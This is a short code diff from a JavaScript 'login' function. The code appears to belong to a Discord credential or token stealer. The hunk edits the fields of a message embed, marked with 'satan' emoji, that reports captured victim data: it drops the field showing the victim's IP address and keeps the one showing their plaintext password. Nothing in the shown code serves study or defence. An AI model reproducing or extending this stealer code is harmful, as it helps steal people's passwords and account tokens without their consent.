@@ -693,11 +693,6 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> IP:',
-            value: `\`${ip}\``,
-            inline: true,
-          },
-          {
             name: '<a:satan:846706207632261120> Password:',
             value: `\`${password}\``,
             inline: true,
